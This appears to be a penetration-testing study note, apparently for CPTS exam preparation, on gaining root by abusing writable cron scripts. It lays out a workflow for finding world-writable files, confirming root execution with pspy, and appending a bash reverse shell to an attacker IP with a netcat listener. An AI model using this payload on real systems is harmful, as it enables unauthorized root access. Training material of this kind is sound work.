# Cron Job Abuse

## Overview
- Cron jobs execute commands/scripts on a schedule.
- Commonly used for:
  - Backups
  - Log cleanup
  - Maintenance tasks
- If a cron job runs as **root** and executes a **writable script**, you can gain **root privileges**.

---

# Crontab Format

```text
* * * * * command
│ │ │ │ │
│ │ │ │ └── Day of week (0-7)
│ │ │ └──── Month
│ │ └────── Day of month
│ └──────── Hour
└────────── Minute
```

Example:

```bash
0 */12 * * * /home/admin/backup.sh
```

Runs every **12 hours**.

---

# Enumeration Checklist

## Find world-writable files

```bash
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
```

Look for:
- Backup scripts
- Maintenance scripts
- Files inside:
  - `/etc/cron.daily/`
  - `/etc/cron.hourly/`
  - `/etc/cron.weekly/`
  - `/etc/cron.d/`
  - `/var/spool/cron/`

---

## Check backup directories

```bash
ls -la /path/to/backup/
```

Things to notice:
- World-writable scripts (`-rwxrwxrwx`)
- New backup files appearing periodically
- Timestamp patterns (helps determine execution interval)

Example:

```text
www-backup-02:24
www-backup-02:27
www-backup-02:30
```

→ Runs every **3 minutes**.

---

# Confirm Cron Execution

Use **pspy** (no root required).

```bash
./pspy64 -pf -i 1000
```

Look for output like:

```text
UID=0 CMD: /bin/bash /dmz-backups/backup.sh
```

This confirms:
- Script path
- Executing user (root)
- Execution frequency

---

# Inspect the Script

```bash
cat /path/to/script.sh
```

Always understand what it does before modifying it.

**Take a backup first:**

```bash
cp script.sh script.sh.bak
```

---

# Exploitation

Append your payload **to the end** of the script.

Example reverse shell:

```bash
bash -i >& /dev/tcp/<YOUR_IP>/443 0>&1
```

Start a listener:

```bash
nc -lvnp 443
```

Wait for the cron job to execute.

---

# Verify Root

```bash
id
hostname
whoami
```

Expected:

```text
uid=0(root)
```

---

# Quick Workflow

1. Find writable files.
2. Look for backup/maintenance scripts.
3. Check timestamps to estimate cron schedule.
4. Confirm with `pspy64`.
5. Backup the script.
6. Append payload.
7. Start listener.
8. Wait for cron execution.
9. Get root shell.

---

# Important Notes

- Root cron jobs often execute:
  - Shell scripts
  - Backup scripts
  - Tar commands
  - Cleanup scripts
- Writable scripts executed by root = **Privilege Escalation**
- `pspy64` is invaluable when you **cannot read crontab**.
- Always append your payload instead of replacing existing commands to reduce the chance of breaking the job.

# Common Commands

```bash
# Find writable files
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null

# List backup directory
ls -la /path/to/dir

# View script
cat script.sh

# Backup script
cp script.sh script.sh.bak

# Monitor cron jobs
./pspy64 -pf -i 1000

# Netcat listener
nc -lvnp 443

# Verify privileges
id
whoami
hostname
```

## CPTS Exam Tips

- ✔ Look for **world-writable scripts** executed by root.
- ✔ Use **pspy64** if crontab is unreadable.
- ✔ Watch backup timestamps to infer cron frequency.
- ✔ Backup scripts before editing.
- ✔ Append payloads instead of overwriting existing logic.
